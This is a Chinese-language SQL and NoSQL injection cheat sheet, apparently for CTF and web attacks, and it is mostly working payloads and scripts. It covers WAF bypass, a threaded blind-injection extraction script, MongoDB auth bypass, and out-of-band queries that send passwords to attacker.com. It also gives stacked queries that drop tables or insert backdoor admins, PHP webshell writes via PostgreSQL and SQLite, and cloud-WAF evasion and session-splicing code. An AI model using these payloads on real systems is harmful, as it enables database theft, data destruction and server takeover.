# SQLi & NoSQLi (数据库注入高阶实战)

数据库注入是 Web 安全中的经典问题，但在 CTF 和现代 Web 对抗中，我们通常需要面对**防注入过滤 (WAF)**、**无回显盲注**以及 **NoSQL（如 MongoDB）** 架构。本指南侧重于高阶利用与 Bypass 策略。

---

## 1. SQL 注入高级 Bypass 技巧

在面临 WAF 过滤时，常规的 `UNION SELECT` 会被直接拦截，必须采用变形与特定数据库特性绕过。

### A. 关键字过滤绕过
*   **双写绕过**（若过滤器只进行一次正则空替换）：
    `UNIunionON SELselectECT` -> 替换掉内部的小写后，外侧重新拼接成 `UNION SELECT`。
*   **大小写变种与混淆**：
    在某些配置不当的旧 WAF 中适用：`UnIoN SeLeCt`。
*   **科学计数法与特殊数值绕过**（针对数字型注入检测）：
    使用 `1e0` 代替 `1`，或 `1.0`，`1.0e0`。
*   **注释符替代空格**：
    利用多行注释 `/**/` 或是 `%09`, `%0a`, `%0d`, `%a0` (在不同操作系统/容器下能解析为空格) 替代被 WAF 过滤的空格。
    `SELECT/**/password/**/FROM/**/users`

### B. 符号过滤绕过
*   **逗号过滤绕过**：
    *   在 `LIMIT` 中：`LIMIT 1 OFFSET 0` 替代 `LIMIT 0,1`。
    *   在 `SUBSTR` 或 `MID` 中：`SUBSTR(password FROM 1 FOR 1)` 替代 `SUBSTR(password, 1, 1)`。
    *   在 `join` 结构中利用 `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` 替代常规多列。
*   **等号过滤绕过**：
    使用 `LIKE`、`REGEXP`、`IN`、`>`、`<` 或 `IS NOT NULL` 替代 `=`。
    `WHERE username LIKE 'admin'`

### C. 宽字节注入 (Wide Byte Injection)
当后端使用 `addslashes` 或魔术引号，对我们的 `'` 自动转义为 `\'`（即添加 `%5c`）：
*   **原理**：如果数据库使用 `GBK` 或类似的多字节编码，我们输入 `%df%27`。
*   **过程**：转义后变为 `%df%5c%27`。而在 GBK 编码中，`%df%5c` 会被系统识别为一个宽汉字（“運”），从而成功把转义符 `%5c` 吃掉，使单引号 `%27` 逃逸闭合。

---

## 2. 无回显盲注（Blind SQLi）并发爆破

对于布尔盲注 (Boolean-based) 或时间盲注 (Time-based)，单线程爆破速度慢且极易超时。本指南建议在 `scripts/` 下编写 Python 盲注脚本时，使用多线程提速。

### 二分法并发爆破核心代码
```python
import concurrent.futures
import requests

URL = "http://target-domain/api.php?id="
# 布尔盲注判断：当响应中包含 "welcome" 时为真

def check_char_at_pos(pos, mid):
    # 使用 LIMIT FROM 避开逗号，用 LIKE 避开等号
    payload = f"1 AND ASCII(SUBSTR((SELECT flag FROM flags) FROM {pos} FOR 1)) > {mid}"
    resp = requests.get(URL + payload)
    return "welcome" in resp.text

def get_char_for_pos(pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if check_char_at_pos(pos, mid):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

# 并发获取 flag (假设长度为 40)
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(get_char_for_pos, range(1, 41))
    flag = "".join(results)
    print(f"Flag extracted: {flag}")
```

---

## 3. NoSQL 注入 (MongoDB 利用)

MongoDB 接受 JSON 或 Query-string 类型的对象查询，这会导致类似 SQLi 的逻辑注入。

### A. 逻辑绕过 (Authentication Bypass)
如果登录接口的接收字段未被过滤：
*   **Payload (JSON)**：
    ```json
    {
      "username": {"$ne": "guest"},
      "password": {"$gt": ""}
    }
    ```
    `$ne` (Not Equal) 和 `$gt` (Greater Than) 会导致 MongoDB 查询条件“用户名不等于 guest 且密码长度大于空”恒成立，从而实现无密码登录。

### B. 正则匹配盲注 (Data Extraction)
利用 `$regex` 魔术操作符逐步爆破数据库字段值：
*   **探测 Payload**：
    ```json
    {
      "username": "admin",
      "password": {"$regex": "^f"}
    }
    ```
    如果服务器返回登录成功，说明 admin 的密码以 `f` 开头。可通过脚本循环 `^fa`, `^fb`... 递归提取出完整的密码。
*   **防范注意**：在正则爆破时，如果密码中包含 `.`, `*`, `+`, `?` 等正则控制字符，记得在发包前使用 `re.escape()` 或是字符转义处理。


---

## 4. Out-of-Band SQLi (OOB) — 无回显时数据外带

```sql
-- ============ MySQL ============
-- 需要 secure_file_priv 为空
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'));
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.attacker.com\\a'));

-- ============ PostgreSQL ============
DROP TABLE IF EXISTS oob; CREATE TABLE oob(t TEXT);
COPY oob FROM PROGRAM 'nslookup $(whoami).attacker.com';

-- ============ MSSQL ============
EXEC master.dbo.xp_dirtree '\\\\attacker.com\\share';
DECLARE @a VARCHAR(8000); SELECT @a=DB_NAME();
EXEC master.dbo.xp_dirtree '\\\\'+@a+'.attacker.com\\';

-- ============ Oracle ============
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL;
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM DUAL;
```

```python
# OOB Listener — 接收 DNS/HTTP callback
# 启动: python3 oob_listener.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import re

class OOBHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 从 path 提取数据
        match = re.search(r'/([a-f0-9]{32,})', self.path)
        if match: print(f"[+] Data: {match.group(1)}")
        self.send_response(204)
    def log_message(self, *args): pass  # 静默

HTTPServer(('0.0.0.0', 80), OOBHandler).serve_forever()
```

---

## 5. Second-Order SQLi (二次注入)

```python
# 攻击模型:
# Step 1: payload 先存入数据库（注册用户名/email/个人简介）
# Step 2: 后续业务用这个脏数据拼接 SQL

SECOND_ORDER_PAYLOADS = {
    "profile_name": "admin' AND 1=1 --",
    "email": "test' OR pg_sleep(5) OR '1'='1",
    "comment": "x'; WAITFOR DELAY '00:00:05'; --",
}

# 探测思路:
# 1. 在所有文本输入点植入各数据库的 sleep payload
# 2. 观察哪些后续页面加载变慢
# 3. 变慢的页面 → 第二次查询用到了你的 dirty data
```

---

## 6. Stacked Queries (多语句)

```sql
'; DROP TABLE users;--
'; INSERT INTO users VALUES('backdoor','hash');--
'; CREATE TABLE shell(data TEXT); LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE shell;--
'; UPDATE users SET role='admin' WHERE username='attacker';--
```

---

## 7. DB 特有技巧

```sql
-- PostgreSQL
CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;
COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/shell.php';
SELECT dblink_connect('host=127.0.0.1 port=6379');  -- SSRF

-- SQLite
SELECT sql FROM sqlite_master WHERE type='table';  -- 无 information_schema
ATTACH DATABASE '/var/www/shell.php' AS s; CREATE TABLE s.x(t TEXT); INSERT INTO s.x VALUES('<?php ?>');

-- Oracle
SELECT extractvalue(xmltype('<!--'),'/') FROM dual;  -- 报错注出
SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) END FROM DUAL;  -- 时间盲注
```

---

## 8. NoSQL 增强：操作符全集 + 嵌套绕过

```python
# MongoDB 完整操作符字典
MONGO_OPS = {
    "$ne": "", "$gt": "", "$gte": "", "$lt": "", "$lte": "",
    "$in": ["admin"], "$nin": ["guest"],
    "$regex": "^a",            # 逐字符爆破
    "$where": "sleep(5000)",   # JS 执行 (旧版)
    "$exists": True,           # 探测字段
    "$type": 2,                # 字段类型 (2=String)
}

# 嵌套绕过 (过滤器只检查顶层 key)
{"user": {"$gt": ""}, "password": {"$gt": ""}}

# $where JS 注入
{"$where": "this.role=='admin'"}
{"$where": "this.constructor.constructor('return process')()"}
```

---

## 9. WAF Bypass 全表

```python
# 空格替代
["/**/", "%09", "%0a", "%0d", "%0b", "%0c", "%a0", "%00"]

# 关键字混淆
SELECT → SeLeCt, SEL/**/ECT, %53%45%4c%45%43%54, SE{LECT (MySQL)

# 等号替代
= → LIKE, REGEXP, BETWEEN, IN, >, <, IS NOT NULL, SOUNDS LIKE

# 注释
-- , #, /**/, ;%00, --%20%2b

# 逗号替代
SUBSTR(col FROM 1 FOR 1) 替代 SUBSTR(col,1,1)
LIMIT 1 OFFSET 0         替代 LIMIT 0,1
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b  替代 UNION SELECT 1,2
```

### Cloud WAF 专项绕过

```python
# Cloudflare: 通常不拦纯 SQL 关键字组合
# 绕过关键: 避开 SQL 注入检测特征 (function(args))
# Cloudflare 检查: sleep(, benchmark(, substr(, ascii(
# 替代品:
#   SLEEP(N)       → GET_LOCK('a', N), 重复计算 BOMB()
#   SUBSTR(a,1,1)  → MID(a,1,1) / LEFT(a,1) / RIGHT(a,1)
#   ASCII()        → ORD()

# AWS WAF: SQL injection rule 检查关键词排列
# 绕过: 内联注释 /*!50000SELECT*/ (MySQL版本注释)

# ModSecurity: 
# 绕过: 分段传输 encoding 差异
#   Content-Type: multipart/form-data + charset=ibm500 (EBCDIC编码)
```

```bash
# sqlmap WAF 绕过 — tamper 链
sqlmap -u "..." --tamper="space2comment,charencode,percentage,randomcase,equaltolike" --technique=BEU --dbs
```

---

## 10. 攻击链

```
SQLi →读用户表 → 管理员密码 hash → crack → 管理后台登录
SQLi → 读配置文件 (LOAD_FILE) → DB 密码 → 内网横向
SQLi → UDF/OUTFILE → 写 webshell → RCE
SQLi → stacked query → INSERT 后门管理员 → 持久化
SQLi → OOB DNS → 逐字节外带 flag → 无回显完成
NoSQLi $regex → 逐字符爆破 JWT secret → JWT 伪造 → Admin API
SQLi → INFORMATION_SCHEMA → 发现其他应用 DB → 跨库攻击

## 11. Content-Type Smuggling for SQLi (WAFFLED)

```python
# WAFFLED-style: 修改 Content-Type → WAF 按 form 解析 (低优先级检查)
# → 但后端按 JSON/XML 解析 → 注入通过

SMUGGLE_HEADERS = {
    "Content-Type": [
        "application/json; charset=utf-8",     # 标准 JSON
        "application/x-www-form-urlencoded",    # WAF form check
        "multipart/form-data; boundary=x",      # WAF 认为 multipart
        "text/plain; charset=utf-8",            # WAF 忽略
        "application/xml",                      # 后端可能解析为 JSON
    ]
}

def content_type_smuggling_sqli(target: str, sqli_payload: str):
    """测试不同 Content-Type 下的 SQLi 是否被 WAF 拦截"""
    for ct in SMUGGLE_HEADERS["Content-Type"]:
        r = requests.post(target, data=sqli_payload, headers={"Content-Type": ct})
        if r.status_code not in (403, 406):
            print(f"  {ct}: {r.status_code}")
```

## 12. Polyglot SQLi Payloads

```sql
-- 一个 payload, 在多种 SQL 方言中都有效
-- MySQL + PostgreSQL + MSSQL 通用:
1'/**/OR/**/1=1/**/--
1' UNION SELECT 1,2,3 FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c --
0'XOR(if(now()=sysdate(),sleep(5),0))XOR'  -- MySQL SLEEP + 其他 DB 无害

-- HTML + SQL polyglot (通过输入同时触发 XSS 和 SQLi):
'><img src=x onerror=alert(1)>' OR '1'='1
```

## 13. Session Splicing (绕过异常评分 WAF)

```python
# 把攻击 payload 拆到多个请求中 → WAF 看不到完整攻击
# 请求 1: 1' UNION SEL
# 请求 2: ECT 1,2,3 FR
# 请求 3: OM users --
# → 某些后端拼接请求 → 形成完整注入

def session_splice(requests_parts: list[str]):
    """用不同 session 分段发送 SQL 关键字"""
    for part in requests_parts:
        # 每个 part 用不同 session → WAF 独立评分 → 都低分放过
        session = requests.Session()
        session.post(target, data={"q": part})
```
```

## Evidence

记录: 真假响应对 (布尔盲注)、快慢时间对 (时间盲注)、OOB DNS/HTTP 日志、Second-order 两步 request/response
